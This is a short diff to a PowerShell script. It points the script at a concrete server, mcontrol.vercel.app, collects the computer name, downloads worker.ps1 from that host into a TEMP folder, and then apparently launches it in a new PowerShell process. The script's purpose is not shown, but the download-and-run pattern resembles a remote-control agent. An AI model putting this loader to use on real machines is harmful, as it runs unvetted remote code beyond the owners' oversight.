@@ -1,4 +1,4 @@
-$SERVER = "https://your-project.vercel.app"
+$SERVER = "https://mcontrol.vercel.app/"
 $SYSTEM = $env:COMPUTERNAME
 
 $TEMP_DIR = "$env:TEMP\worker_env"
@@ -43,7 +43,7 @@ function Start-Worker {
     }
 
     Invoke-WebRequest `
-        -Uri "https://server/worker.ps1" `
+        -Uri "https://mcontrol.vercel.app/worker.ps1" `
         -OutFile "$TEMP_DIR\worker.ps1"
 
     $global:WORKER = Start-Process powershell `
